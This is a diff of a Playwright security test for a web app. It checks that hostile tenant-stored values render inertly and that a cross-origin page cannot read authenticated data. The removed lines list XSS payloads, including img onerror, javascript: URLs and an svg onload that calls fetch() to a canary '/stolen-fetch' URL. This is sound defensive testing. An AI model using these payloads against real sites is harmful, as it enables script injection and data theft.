@@ -1,11 +1,11 @@
 import { expect, test, type Page } from '@playwright/test';
-import { z } from 'zod';
-import { zPublishResult, zOrgList, zEnvironmentSettings } from '@hikyo/zod';
-import { browserApi, zFixtureStaged } from '../fixtures/api.ts';
+import { zOrgList, zEnvironmentSettings } from '@hikyo/zod';
+import { browserApi } from '../fixtures/api.ts';
 import { ADMIN, BASE_URL, STORAGE_STATE } from '../fixtures/instance.ts';
 import { startCanary } from './canary.ts';
 import { SECURITY_FIXTURE_CONFIGURATION } from './configuration.ts';
 import { readSecuritySeed } from './seed.ts';
+import { readStoredContent } from './stored-content.ts';
 
 test.use({ storageState: STORAGE_STATE });
 
@@ -46,57 +46,52 @@ async function observe(page: Page, canaryRequests: number): Promise<Observation>
 }
 
 test('stored-content: native authenticated production SPA renders hostile tenant names, values and URLs safely', async ({ page }) => {
-  const canary = await startCanary();
-  try {
-    const seed = readSecuritySeed();
-    const response = await page.goto('/');
-    expect(response?.headers()['content-security-policy']).toContain('script-src');
-    await expect(page.getByRole('button', { name: `Organisation ${seed.orgName}`, exact: true })).toBeVisible();
-    await expect(page.getByRole('button', { name: `Organisation ${seed.orgBName}`, exact: true })).toBeVisible();
-    expect(violations(await observe(page, canary.hits.length))).toEqual([]);
-    const settingsBase = `/api/v1/orgs/${seed.org}/projects/${seed.project}/environments`;
-    const development = await browserApi(page, 'GET', `${settingsBase}/${seed.dev}/settings`, zEnvironmentSettings);
-    const protectedEnvironment = await browserApi(page, 'GET', `${settingsBase}/${seed.prod}/settings`, zEnvironmentSettings);
-    expect(development.protected).toBe(false);
-    expect(development.reauth_window_seconds).toBe(SECURITY_FIXTURE_CONFIGURATION.development_disclosure_window_seconds);
-    // The product caps every protected environment's effective window at zero,
-    // even when its stored optional setting has no explicit window override.
-    expect(protectedEnvironment.protected).toBe(true);
-    expect(new URL(page.url()).origin).toBe(BASE_URL);
-    const payloads = [
-      `<img src="${canary.origin}/stolen-image" onerror="document.documentElement.dataset.hikyoSecurity=1">`,
-      `javascript:document.documentElement.dataset.hikyoSecurity=1`,
-      `${canary.origin}/stolen-link?credential=tenant-content`,
-      `<svg onload="fetch('${canary.origin}/stolen-fetch');document.documentElement.dataset.hikyoSecurity=1">`,
-    ];
-    const versions: string[] = [];
-    for (const [index, value] of payloads.entries()) {
-      const name = `SECURITY_CANARY_${String(index)}`;
-      await browserApi(page, 'POST', `/api/v1/orgs/${seed.org}/projects/${seed.project}/keys`, z.object({ id: z.string() }), {
-        name, classification: 'config', declaration: { rule: { type: 'string' } },
-      });
-      const staged = await browserApi(page, 'PUT', `/api/v1/orgs/${seed.org}/projects/${seed.project}/environments/${seed.dev}/values/${name}`, zFixtureStaged, { value });
-      versions.push(staged.version_id);
-    }
-    await browserApi(page, 'POST', `/api/v1/orgs/${seed.org}/projects/${seed.project}/environments/${seed.dev}/publish`, zPublishResult, { version_ids: versions });
-    await page.goto(`/orgs/${seed.org}/projects/${seed.project}/matrix`);
-    for (const value of payloads) await expect(page.locator('.matrix-cell__value').getByText(value, { exact: true })).toBeVisible();
-    await expect(page.locator('[onload], [onerror], a[href^="javascript:"]')).toHaveCount(0);
-    await expect.poll(async () => violations(await observe(page, canary.hits.length))).toEqual([]);
-    // A real completion barrier after two paints and all DOM assertions;
-    // arbitrary sleeps cannot prove the malicious payload reached a sink.
-    await page.evaluate(() => new Promise<void>((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve()))));
-    expect(violations(await observe(page, canary.hits.length))).toEqual([]);
-    await page.reload();
-    await expect(page.locator('.matrix-cell__value').getByText(payloads[0] ?? '', { exact: true })).toBeVisible();
-    expect(violations(await observe(page, canary.hits.length))).toEqual([]);
-  } finally { await canary.close(); }
+  const seed = readSecuritySeed();
+  const settingsBase = `/api/v1/orgs/${seed.org}/projects/${seed.project}/environments`;
+  const { payloads } = readStoredContent();
+  // Inspect the real settings reads the matrix needs instead of issuing
+  // duplicate fixture reads against the same source allowance.
+  const developmentRead = page.waitForResponse(`${BASE_URL}${settingsBase}/${seed.dev}/settings`);
+  const protectedRead = page.waitForResponse(`${BASE_URL}${settingsBase}/${seed.prod}/settings`);
+  const matrix = `${BASE_URL}/orgs/${seed.org}/projects/${seed.project}/matrix`;
+  const response = await page.goto(matrix);
+  expect(response?.headers()['content-security-policy']).toContain('script-src');
+  await expect(page.getByRole('button', { name: `Organisation ${seed.orgName}`, exact: true })).toBeVisible();
+  await expect(page.getByRole('button', { name: `Organisation ${seed.orgBName}`, exact: true })).toBeVisible();
+  expect(violations(await observe(page, readStoredContent().hits))).toEqual([]);
+  expect(new URL(page.url()).origin).toBe(BASE_URL);
+  await expect(page).toHaveURL(matrix);
+  const developmentResponse = await developmentRead;
+  const protectedResponse = await protectedRead;
+  expect(developmentResponse.status()).toBe(200);
+  expect(protectedResponse.status()).toBe(200);
+  const development = zEnvironmentSettings.parse(await developmentResponse.json());
+  const protectedEnvironment = zEnvironmentSettings.parse(await protectedResponse.json());
+  expect(development.protected).toBe(false);
+  expect(development.reauth_window_seconds).toBe(SECURITY_FIXTURE_CONFIGURATION.development_disclosure_window_seconds);
+  // The product caps every protected environment's effective window at zero,
+  // even when its stored optional setting has no explicit window override.
+  expect(protectedEnvironment.protected).toBe(true);
+  for (const value of payloads) await expect(page.locator('.matrix-cell__value').getByText(value, { exact: true })).toBeVisible();
+  await expect(page.locator('[onload], [onerror], a[href^="javascript:"]')).toHaveCount(0);
+  await expect.poll(async () => violations(await observe(page, readStoredContent().hits))).toEqual([]);
+  // A real completion barrier after two paints and all DOM assertions;
+  // arbitrary sleeps cannot prove the malicious payload reached a sink.
+  await page.evaluate(() => new Promise<void>((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve()))));
+  expect(violations(await observe(page, readStoredContent().hits))).toEqual([]);
+  await page.reload();
+  await expect(page.locator('.matrix-cell__value').getByText(payloads[0] ?? '', { exact: true })).toBeVisible();
+  expect(violations(await observe(page, readStoredContent().hits))).toEqual([]);
 });
 
 test('hostile-origin: cross-origin page cannot read authenticated data or mutate protected tenant state', async ({ page, context }) => {
   const canary = await startCanary();
   try {
-    await page.goto('/');
+    // A native discovery document establishes the application's storage origin
+    // without starting an unrelated SPA refetch tree. The authorized controls
+    // use real saved cookies; attacks run on the canary-origin page below.
+    const document = await page.goto('/api/v1/meta');
+    expect(document?.status()).toBe(200);
     const before = await browserApi(page, 'GET', '/api/v1/orgs', zOrgList);
     const attacker = await context.newPage();
     await attacker.goto(canary.origin);
